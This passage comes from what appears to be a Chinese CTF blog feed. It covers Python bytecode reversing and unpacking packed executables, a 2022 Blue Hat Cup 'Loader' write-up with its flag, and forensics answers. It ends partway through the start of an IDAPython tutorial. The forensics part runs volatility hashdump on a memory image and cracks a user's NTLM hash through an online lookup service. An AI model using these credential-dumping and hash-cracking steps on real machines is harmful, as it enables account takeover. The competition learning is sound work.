class="hljs-built_in">print</span>(dis.dis(code))<br></code></pre></td></tr></table></figure></blockquote><p>可以得到：</p><p><img src="https://s2.loli.net/2022/07/13/nJ7lUNhOyfLwMK2.png" alt="7.png"></p><p>可以成功的看到我们的<code>pyc</code>转换为对应的字节码了。那么需要怎么逆向呢？</p><p>这个时候就需要借助官方文档了，相对汇编来说<code>Py</code>的字节码相对更好阅读一些，其中<code>python3</code>是每两个字节一个字节码语句，<code>python2</code>是三个字节，之前也提到过</p><p>我们查询对应<code>python</code>的手册，可以查看对应的字节码功能，下面给出一部分例子</p><blockquote><p>LOAD_CONST(<em>consti</em>)</p><p>将 <code>co_consts[consti]</code> 推入栈顶。</p><p><code>MAKE_FUNCTION</code>(<em>flags</em>)</p><p>将一个新函数对象推入栈顶。</p><p>…</p></blockquote><p>同样我们举出一个例子来尝试逆向(下面为<code>python3</code>字节码)：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py">  <span class="hljs-number">0</span> LOAD_CONST               <span class="hljs-number">1</span> (<span class="hljs-number">0</span>)<br>            <span class="hljs-number">2</span> STORE_FAST               <span class="hljs-number">1</span> (num)<br><br><span class="hljs-number">3</span>           <span class="hljs-number">4</span> SETUP_LOOP              <span class="hljs-number">42</span> (to <span class="hljs-number">48</span>)<br>            <span class="hljs-number">6</span> LOAD_GLOBAL              <span class="hljs-number">0</span> (<span class="hljs-built_in">range</span>)<br>            <span class="hljs-number">8</span> LOAD_CONST               <span class="hljs-number">2</span> (<span class="hljs-number">8</span>)<br>           <span class="hljs-number">10</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>           <span class="hljs-number">12</span> GET_ITER<br>      &gt;&gt;   <span class="hljs-number">14</span> FOR_ITER                <span class="hljs-number">30</span> (to <span class="hljs-number">46</span>)<br>           <span class="hljs-number">16</span> STORE_FAST               <span class="hljs-number">2</span> (i)<br><br><span class="hljs-number">4</span>          <span class="hljs-number">18</span> LOAD_FAST                <span class="hljs-number">1</span> (num)<br>           <span class="hljs-number">20</span> LOAD_CONST               <span class="hljs-number">3</span> (<span class="hljs-number">7508399208111569251</span>)<br>           <span class="hljs-number">22</span> BINARY_SUBTRACT<br>           <span class="hljs-number">24</span> LOAD_CONST               <span class="hljs-number">4</span> (<span class="hljs-number">4294967295</span>)<br>           <span class="hljs-number">26</span> BINARY_MODULO<br>           <span class="hljs-number">28</span> STORE_FAST               <span class="hljs-number">1</span> (num)<br></code></pre></td></tr></table></figure><p>首先我们可以看到程序加载了一个常数加载到<code>num</code>中，即可以转换为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">num = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><blockquote><p>0 LOAD_CONST               1 (0)<br>2 STORE_FAST               1 (num)</p></blockquote><p>随后其有设置一个循环(<code>SETUP_LOOP</code>)，从 0 到 8</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">range</span>(<span class="hljs-number">8</span>):<br></code></pre></td></tr></table></figure><blockquote><p>3           4 SETUP_LOOP              42 (to 48)<br>6 LOAD_GLOBAL              0 (range)<br>8 LOAD_CONST               2 (8)<br>10 CALL_FUNCTION            1<br>12 GET_ITER<br>&gt;&gt;   14 FOR_ITER                30 (to 46)<br>16 STORE_FAST               2 (i)</p></blockquote><p>然后我们将一个数字加载到<code>num</code>中，再进行减运算，最后存储到<code>num</code>里</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">num</span> = (num - <span class="hljs-number">7508399208111569251</span>) % <span class="hljs-number">4294967295</span><br></code></pre></td></tr></table></figure><blockquote><p><code>BINARY_MODULO</code></p><p>实现 <code>TOS = TOS1 % TOS</code> ,<code>TOS</code>为栈顶 <code>TOS1</code>为栈中下一位数据的值</p></blockquote><blockquote><p>4          18 LOAD_FAST                1 (num)<br>20 LOAD_CONST               3 (7508399208111569251)<br>22 BINARY_SUBTRACT<br>24 LOAD_CONST               4 (4294967295)<br>26 BINARY_MODULO<br>28 STORE_FAST               1 (num)</p></blockquote><p>综上我们可以得到对应的代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>num = (num - <span class="hljs-number">7508399208111569251</span>) % <span class="hljs-number">4294967295</span><br></code></pre></td></tr></table></figure><p>至此<code>py</code>的字节码逆向就结束了</p><h2 id="Python打包EXE">Python打包EXE</h2><p>对于这个我们通过一个<code>py</code>脚本<code>(pyinstxtractor.py)</code>将其变成结构体和一个<code>pyc</code>文件，需要注意的是，在得到的对应<code>pyc</code>文件中缺少了时间属性和对应版本的魔术字，需要我们进行手动修复，通过找到<code>struct.pyc</code>文件里面的对应的字节，我们复制到我们题目的<code>.pyc</code>文件前，之后便可以使用<code>uncompyle6</code>进行反编译</p><p>假如我们无法直观识别呢？我们直接将其拖入到<code>IDA</code>中进行观察一下：<br><img src="https://s2.loli.net/2022/07/13/FhkOX58WQxyDPnt.png" alt="8.png"></p><p>我们可以注意到在字符串中存在大量的<code>Py</code>开头的东西，这个是一般程序逆向所遇不到的，至此我们便可以识别出来这个程序是一个<code>python</code>所打包构成的<code>exe</code>文件</p><p>我们尝试进行解包，来拿到我们想要的数据：</p><p><img src="https://s2.loli.net/2022/07/13/ZEw2QHj6qBRnert.png" alt="9.png"></p><p>通过执行上述代码我们可以得到一个文件夹：</p><p><img src="https://s2.loli.net/2022/07/13/REYSvc6GzTKs8Le.png" alt="10.png"></p><p>我们在文件夹里面找到题目名字的<code>pyc</code>文件和<code>struct.pyc</code>文件，将其拖入到<code>010</code>(16进制数据查看器)中</p><p><img src="https://s2.loli.net/2022/07/13/id69z3QOcbaHGpq.png" alt="11.png"></p><p><img src="https://s2.loli.net/2022/07/13/rpKidDtbP1XUHfj.png" alt="12.png"></p><p>通过观察我们可以发现程序缺少了对应红色框部分的魔数字节，我们复制<code>struct.pyc</code>中的红框内容替换掉<code>login.pyc</code>内红框内容，之后保存<code>login.pyc</code></p><p><img src="https://s2.loli.net/2022/07/13/dKI2SVMatPqcxH4.png" alt="13.png"></p><p>之后我们就可以拿<code>uncompyle6</code>进行反编译啦</p><p><img src="https://s2.loli.net/2022/07/13/gBMesVdQnI5aRJl.png" alt="14.png"></p><p>可以看到我们成功的将其反编译成<code>.py</code>源码了，之后逆向部分就可以参考前文提到的<code>py</code>源码逆向啦</p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022蓝帽杯 Loader 题解</title>
    <link href="/2022/07/13/%E8%93%9D%E5%B8%BD%E6%9D%AF%20LOADER%20%E9%80%86%E5%90%91/"/>
    <url>/2022/07/13/%E8%93%9D%E5%B8%BD%E6%9D%AF%20LOADER%20%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>逆向这个属于是费神，费力…主要函数功能还是要靠调试和猜测来进行得出…写此篇文章也希望能对后续的复现者能够有所帮助</p><h2 id="子程序程序主函数">子程序程序主函数</h2><p><img src="https://s2.loli.net/2022/07/13/HexwTGqRPtX8krV.png" alt="1.png"></p><p>直接拖到<code>IDA</code>中，程序会分析出来对应的主函数，在主函数我们可以观察到一个<code>VirtuaalProtect</code>函数，通过程序名称我们也可以知道程序是一个加载一个新的<code>PE</code>来完成对应的功能。为了到新的子程序中，我们采用调试将对应的数据段按<code>P</code>进行构建函数，通过不断的测试哪些地方会调用输出的方式我们找到对应子程序的<code>main</code></p><p><img src="https://s2.loli.net/2022/07/13/SldJ18VxacbLNzG.png" alt="2.png"></p><p>找到之后就是开始我们漫长的调试之路了…</p><h2 id="过程分析">过程分析</h2><p>进入到子程序的主函数后，我们调试可以得出一些信息，比如哪些是输出，和输入，同时我们会注意到检测<code>flag</code>的格式的部分：</p><p><img src="https://s2.loli.net/2022/07/13/M7G8aldpguYyrn3.png" alt="3.png"></p><p>可以判断出来程序的主要部分是<code>flag&#123;XXX&#125;</code>总共的长度是<code>42</code>位</p><p><img src="https://s2.loli.net/2022/07/13/wJzSc8k5rjKTLeY.png" alt="4.png"></p><p>之后的调试需要我们多次切换到对应的内存中去观察，尝试去取对应的<code>十进制</code>数据多次观察后我们可以发现程序将我们的输入转换为了无符号的<code>long long</code>类型的一个数据，毕竟我们输入的也是字符串，如果程序需要进行对应的加密也需要将我们的输入转换为数字，方便后面的运算</p><p><img src="https://s2.loli.net/2022/07/13/ot5DjCQK8MXeZNb.png" alt="5.png"></p><p>之后程序会将你的输入进行判断，判断是否在大小区间内，如果不在范围内就会跳转到错误处，结束程序</p><p>在我们标出对应的数据后，整体逆向就轻松了许多，我们大致可以猜测<code>_mm_lodau_si128</code>是将后面的偏移地址处的数据进行加载，那么可以猜测在这个前后应该会有加密部分</p><p><img src="https://s2.loli.net/2022/07/13/S1V5Ju8tpW3scKG.png" alt="10.png"></p><p>我们不断调试可以发现这个加密函数的一种特点，即前两个是运算的数据，最后一个为保存数据的偏移地址，通过这个特点，结合调试，我们可以找到另外的几个加密函数，如下：</p><p><img src="https://s2.loli.net/2022/07/13/tVvSniLcGfZTRCq.png" alt="6.png"></p><p><img src="https://s2.loli.net/2022/07/13/GMHFK8LIjd5xNwW.png" alt="7.png"></p><p>上面两个函数通过调试与观察对应的内存空间我们可以发现其过程就是一个乘法，但是因为两个数相同，即为求平方</p><p>同时一个数据比较坑的是下面的一个<code>减法</code>运算，和进行比较最后的<code>a3</code>处的偏移地址的值是否等于<code>9</code></p><p><img src="https://s2.loli.net/2022/07/13/5F9S31KA2rMHowq.png" alt="8.png"></p><p>在减法运算中，两个数据被转换为了<code>unsigned int</code>类型而加的<code>0x100000000i64</code>已经发生了溢出，对应的后32位字节我们得到的是 0 ，因此在加法运算中我们将其忽略即可。<img src="https://s2.loli.net/2022/07/13/fxi5yX9uWHPvcYs.png" alt="9.png"></p><p>大致流程在多次调试后可以理出来一个计算公式：<br>$$<br>input1^2-11*(input2^2)=9<br>$$<br>其中输入的要求长度为<code>42</code>，我们减去<code>flag&#123;&#125;</code>的长度可以发现是<code>18*2  (36)</code>同时我们的输入也是拆成了两个长<code>18</code>的数据进行计算，因此<code>input1</code>为我们输入<code>36</code>位数字的前<code>18</code>个，<code>input2</code>为输入的后<code>18</code>位数字</p><p>对此我们可以采用：<a href="https://www.wolframalpha.com/">https://www.wolframalpha.com/</a> 进行求解</p><p><img src="https://s2.loli.net/2022/07/13/2JrDQoVc5y47uRB.png" alt="11.png"></p><p>发现计算出来的<code>y</code>少了一位，我们将其补上一个前缀<code>0</code>即可得到<code>flag</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">118936021352508390035860559716724409</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 蓝帽杯电子取证部分WP</title>
    <link href="/2022/07/09/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%20WP/"/>
    <url>/2022/07/09/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%20WP/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>整个比赛下来十分坐牢，就只有取证能稍微动一下下，真 —— 取证大赛，比赛结束了，也就只有取证是有解，其他的题目一个没动…</p><p>以下仅有的也是取证的 wp 题解…</p><h2 id="电子取证">电子取证</h2><h3 id="手机取证-1">手机取证_1</h3><p>Q：现对一个苹果手机进行取证，请您对以下问题进行分析解答。<code>627604C2-C586-48C1-AA16-FF33C3022159.PNG</code>图片的分辨率是？</p><p>A：</p><p>直接在目录下找到这个图片查看对应分辨率即可</p><p><img src="https://s2.loli.net/2022/07/09/PlWwCeUQ9JH7Vxa.png" alt="12.png"></p><p>只后在对应目录下找到图片即可:</p><p><img src="https://s2.loli.net/2022/07/09/pblwyk2n8PzYoui.png" alt="13.png"></p><h3 id="手机取证-2">手机取证_2</h3><p>Q：姜总的快递单号是多少？</p><p>A：</p><p>打开手机取证附件中自带的阅读器</p><p>在社交通讯——国际处进行查找对应信息</p><p><img src="https://s2.loli.net/2022/07/09/MDFhfgmP1vARtVr.png" alt="1.png"></p><h3 id="计算机取证-1">计算机取证_1</h3><p>Q：现对一个windows计算机进行取证，请您对以下问题进行分析解答。从内存镜像中获得taqi7的开机密码是多少？</p><p>A：</p><p>使用<code>volatility</code>执行以下语句进行查看内存信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">volatility -f 1.dmp imageinfo<br></code></pre></td></tr></table></figure><blockquote><p>得到信息如下：</p><p>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search…<br>Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br>AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)<br>AS Layer2 : FileAddressSpace (F:\MISC题目\2022蓝帽\1.dmp)<br>PAE type : No PAE<br>DTB : 0x187000L<br>KDBG : 0xf80003ffa0a0L<br>Number of Processors : 1<br>Image Type (Service Pack) : 1<br>KPCR for CPU 0 : 0xfffff80003ffbd00L<br>KUSER_SHARED_DATA : 0xfffff78000000000L<br>Image date and time : 2022-04-28 05:54:55 UTC+0000<br>Image local date and time : 2022-04-28 13:54:55 +0800</p></blockquote><p>随后执行以下语句获取到对应<code>hash</code>加密后的登录密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">volatility -f 1.dmp --profile=Win7SP1x64 hashdump<br></code></pre></td></tr></table></figure><blockquote><p>得到信息如下：</p><p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>taqi7:1000:aad3b435b51404eeaad3b435b51404ee:7f21caca5685f10d9e849cc84c340528:::<br>naizheng:1002:aad3b435b51404eeaad3b435b51404ee:d123b09e13b1a82277c3e3f0ca722060:::<br>qinai:1003:aad3b435b51404eeaad3b435b51404ee:1c333843181864a58156f3e9498fe905:::</p></blockquote><p>则我们将<code>7f21caca5685f10d9e849cc84c340528</code>进行<code>hash</code>解密即可，可以使用网站：<code>https://www.cmd5.com/</code></p><p>即可得到密码：<code>anxinqi</code></p><h3 id="计算机取证-2">计算机取证_2</h3><p>Q：制作该内存镜像的进程Pid号是多少？</p><p>A：</p><p>执行以下语句，获取进程列表，找到制作镜像的程序对应<code>PID</code>即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">volatility</span> -f <span class="hljs-number">1</span>.dmp --profile=Win<span class="hljs-number">7</span>SP<span class="hljs-number">1</span>x<span class="hljs-number">64</span> pslist<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/09/XuDOIgs1ylVSBpC.png" alt="2.png"></p><h3 id="程序分析-1">程序分析_1</h3><p>Q：现已获取某个APP程序，请您对以下问题进行分析解答。本程序包名是？</p><p>A：<br>直接加载到<code>GDA</code>中，查看对应的包名即可：<br><img src="https://s2.loli.net/2022/07/09/GHM943qUXWypTOj.png" alt="3.png"></p><h3 id="程序分析-2">程序分析_2</h3><p>Q：本程序的入口是？</p><p>A：</p><p>点击<code>APK入口</code>，程序便会帮我们自动跳转到入口点，输入对应包路径即可</p><p><img src="https://s2.loli.net/2022/07/09/z7p31SVwOhFdXeI.png" alt="4.png"></p><h3 id="程序分析-3">程序分析_3</h3><p>Q：本程序的服务器地址的密文是？</p><p>A：</p><p>找到对应包路径下的主函数，直接就可以看到</p><p><img src="https://s2.loli.net/2022/07/09/ctFjTPg5pCvyhIK.png" alt="5.png"></p><h3 id="网站取证-1">网站取证_1</h3><p>Q：据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。请从网站源码中找出木马文件，并提交木马连接的密码</p><p>A：<br>拿到对应网站源码后直接拿火绒进行扫描，便可以发现后门脚本：</p><p><img src="https://s2.loli.net/2022/07/09/bcW3XGQaoVkOyUl.png" alt="6.png"></p><p>打开该<code>php</code>文件，便可以发现对应的密码</p><p><img src="https://s2.loli.net/2022/07/09/7SrFPAn4zdTmXte.png" alt="7.png"></p><h3 id="网站取证-2">网站取证_2</h3><p>Q：请提交数据库连接的明文密码</p><p>A：</p><p>在网站源码目录下找到<code>database.php</code></p><p><img src="https://s2.loli.net/2022/07/09/Bfx6E5MCKp1USLY.png" alt="8.png"></p><p>可以发现其导入了<code>encrypt.php</code>，同时调用了其中的<code>my_encrypt()</code>函数，我们找到<code>encrypt.php</code>，发现其是一个解密函数，我们直接跑一下函数就行</p><p><img src="https://s2.loli.net/2022/07/09/HOiCNpK6zUr1R83.png" alt="9.png"></p><p>到在线网站上跑一下：</p><p><img src="https://s2.loli.net/2022/07/09/A6tp1cw5DYgUJjx.png" alt="10.png"></p><h3 id="网站取证-3">网站取证_3</h3><p>Q：请提交数据库金额加密混淆使用的盐值</p><p>A：</p><p>找到源码目录<code>application\admin\controller</code>下的<code>Channelorder.php</code>，即可直接得到对应盐值：</p><p><img src="https://s2.loli.net/2022/07/09/g1NMtXSGajfBncC.png" alt="11.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF WriteUp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IDAPython 学习</title>
    <link href="/2022/07/07/IDAPython%20%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/07/07/IDAPython%20%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="IDAPython-背景">IDAPython 背景</h2><p><code>IDAPython</code> 创建于 2004 年。这是<code>Gergely Erdelyi</code>和<code>Ero Carrera</code>的共同努力。他们的目标 是结合强大的<code>python</code>与自动化分析的<code>IDA</code>的类<code>C</code>脚本语言<code>IDC</code>。<code>IDAPython</code> 由三个独立模块 组成。第一个是<code>idc</code>，它是封装<code>IDA</code>的<code>IDC</code>函数的兼容性模块。第二个模块是<code>idautils</code>，这是<code>IDA</code>里的一个高级实用函数。第三个模块是<code>idaapi</code>，它允许访问更多低级数据，这些数据能 够被类使用通过<code>IDA</code>。</p><h2 id="基础">基础</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00012529 mov esi, [esp+4+arg_0]<br></code></pre></td></tr></table></figure><p><code>text</code>是节的名称，地址是<code>00012529</code>。显示的地址是 16 进制格式。<code>mov</code>这个指令被称作助记符。助记符后面的第一个操作是<code>esi</code>和第二个操作是<code>[esp+4+arg_0]</code>，</p><h2 id="地址">地址</h2><p><code>IDAPython</code>文档中地址作为<code>ea</code>被引用，地址可以通过几个不同的函数进行访问：</p><p>获取当前的地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">ea = idc.ScreenEA()<br>--- 或者 ---<br>ea = here()<br></code></pre></td></tr></table></figure><p>获取最大地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">MaxEA()<br></code></pre></td></tr></table></figure><p>获取最小地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">MinEA()<br></code></pre></td></tr></table></figure><p>检测地址是否存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; idaapi.BADADDR<br><span class="hljs-number">4294967295</span><br>Python&gt; <span class="hljs-built_in">hex</span>(idaapi.BADADDR)<br><span class="hljs-number">0xffffffffL</span><br>Python&gt; <span class="hljs-keyword">if</span> BADADDR != here(): <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;valid address&quot;</span>)<br>valid address<br></code></pre></td></tr></table></figure><h2 id="元素访问">元素访问</h2><p>获取段名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">idc.SegName(ea) <span class="hljs-comment"># ea是地址</span><br></code></pre></td></tr></table></figure><p>获取反汇编字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">idc.GetDisasm(ea)<br></code></pre></td></tr></table></figure><p>获取操作数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">idc.GetOpnd(ea,<span class="hljs-number">0</span>) <span class="hljs-comment"># 获取第一个操作数</span><br>idc.GetOpnd(ea,<span class="hljs-number">1</span>) <span class="hljs-comment"># 获取第二个操作数</span><br></code></pre></td></tr></table></figure><h2 id="段">段</h2><p>打印一行作用不大。<code>IDAPython</code>的强大来自于遍历所有的指令，交叉引用地址和搜索代 码或数据。后面两部分将在后面更详细地描述。遍历所有段将是一个不错的开始的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 获取所有段名与其开始和结束的地址</span><br>Python&gt; <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> idautils.Segments():<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(idc.SegName(seg), idc.SegStart(seg), idc.SegEnd(seg))<br>HEADER <span class="hljs-number">65536</span> <span class="hljs-number">66208</span><br>.idata <span class="hljs-number">66208</span> <span class="hljs-number">66636</span><br>.text <span class="hljs-number">66636</span> <span class="hljs-number">212000</span><br>.data <span class="hljs-number">212000</span> <span class="hljs-number">217088</span><br>.edata <span class="hljs-number">217088</span> <span class="hljs-number">217184</span><br>INIT <span class="hljs-number">217184</span> <span class="hljs-number">219872</span><br>.reloc <span class="hljs-number">219872</span> <span class="hljs-number">225696</span><br>GAP <span class="hljs-number">225696</span> <span class="hljs-number">229376</span><br></code></pre></td></tr></table></figure><p><code>idautils.Segments()</code>返回一个遍历类型对象，我们可以循环这个对象通过使用一个<code>for</code>循 环。列表中的每个项都是段的起始地址。如果我们把它作为作为一个参数去调用<code>idc.SegName(ea)</code>，地址可以被用来获取名称。开始和结束的段可以通过调用<code>idc.SegStart(ea)</code>或<code>idc.SegEnd(ea)</code>获得。地址或<code>ea</code>需要位于段的开始或结束的范围内。如果我们不想遍历所有段，但想找到下一段我们可以使用<code>idc.NextSeg(ea)</code>。地址可以是段范围内的任何我们希望找到的下一段的地址。如果有机会我们想要通过名称获取一个段的开始地址，我们可以使用<code>idc.SegByName(segname)</code>。</p><h2 id="函数">函数</h2><p>既然我们知道如何遍历所有段，我们就应该研究如何遍历所有已知函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 遍历所有函数的地址和函数名</span><br>Python&gt; <span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> idautils.Functions():<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), idc.GetFunctionName(func))<br>Python&gt;<br><span class="hljs-number">0x401000</span> ?DefWindowProcA@CWnd@@MAEJIIJ@Z<br><span class="hljs-number">0x401006</span> ?LoadFrame@CFrameWnd@@UAEHIKPAVCWnd@@PAUCCreateContext@@@Z<br><span class="hljs-number">0x40100c</span> ??<span class="hljs-number">2</span>@YAPAXI@Z<br><span class="hljs-number">0x401020</span> save_xored<br><span class="hljs-number">0x401030</span> sub_401030<br>....<br><span class="hljs-number">0x45c7b9</span> sub_45C7B9<br><span class="hljs-number">0x45c7c3</span> sub_45C7C3<br><span class="hljs-number">0x45c7cd</span> SEH_44A590<br><span class="hljs-number">0x45c7e0</span> unknown_libname_14<br><span class="hljs-number">0x45c7ea</span> SEH_43EE30<br></code></pre></td></tr></table></figure><p><code>idautils.Functions()</code>将返回一个已知函数列表。这个列表将包含起始地址的每一个函数。 <code>idautils.Functions()</code>可传递的参数范围内搜索。如果我们想要搜索可以通过开始地址和结束地址<code>idautils.Funtions(start_addr, end_addr)</code>。 获得一个函数的名称我们使用<code>idc.GetFunctionName(ea)</code>。<code>ea</code>可以是函数边界的任何地址。<code>IDAPython</code>含有大量的<code>API</code>集合提供使用的函数。让我们从一个简单的功能开始。这个函数的语义不重要，但我们应该在心里创建一个地址的记录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0045C7C3 sub_45C7C3 proc near<br>.text:0045C7C3 mov eax, [ebp-60h]<br>.text:0045C7C6 push eax ; void *<br>.text:0045C7C7 call w_delete<br>.text:0045C7CC retn<br>.text:0045C7CC sub_45C7C3 endp<br></code></pre></td></tr></table></figure><p>获得边界我们可以使用<code>idaapi.get_func(ea)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 获取当前 ea 地址处函数的地址范围</span><br>Python&gt; func = idaapi.get_func(ea)<br>Python&gt; <span class="hljs-built_in">type</span>(func)<br>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">idaapi</span>.<span class="hljs-title">func_t</span>&#x27;&gt;</span><br><span class="hljs-class"><span class="hljs-title">Python</span>&gt; <span class="hljs-title">print</span>(<span class="hljs-params"><span class="hljs-string">&quot;Start: 0x%x, End: 0x%x&quot;</span> % (<span class="hljs-params">func.startEA,</span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-class">func.endEA</span>)</span>)</span><br><span class="hljs-class"><span class="hljs-title">Start</span>:</span> <span class="hljs-number">0x45c7c3</span>, End: <span class="hljs-number">0x45c7cd</span><br></code></pre></td></tr></table></figure><p><code>idaapi.get_func(ea)</code>返回一个类的<code>idaapi.func_t</code>。有时它并不总是显而易见的如何使用一 个类的返回通过一个函数调用。一个有用的命令去查询在<code>Python</code>中的类是<code>dir(class)</code>函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; <span class="hljs-built_in">dir</span>(func)<br>[<span class="hljs-string">&#x27;__class__&#x27;</span>, <span class="hljs-string">&#x27;__del__&#x27;</span>, <span class="hljs-string">&#x27;__delattr__&#x27;</span>, <span class="hljs-string">&#x27;__dict__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>,<br><span class="hljs-string">&#x27;__eq__&#x27;</span>, <span class="hljs-string">&#x27;__format__&#x27;</span>, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>, <span class="hljs-string">&#x27;__gt__&#x27;</span>,<br><span class="hljs-string">&#x27;__hash__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>, <span class="hljs-string">&#x27;__lt__&#x27;</span>, <span class="hljs-string">&#x27;__module__&#x27;</span>, <span class="hljs-string">&#x27;__ne__&#x27;</span>,<br><span class="hljs-string">&#x27;__new__&#x27;</span>, <span class="hljs-string">&#x27;__reduce__&#x27;</span>, <span class="hljs-string">&#x27;__reduce_ex__&#x27;</span>, <span class="hljs-string">&#x27;__repr__&#x27;</span>,<br><span 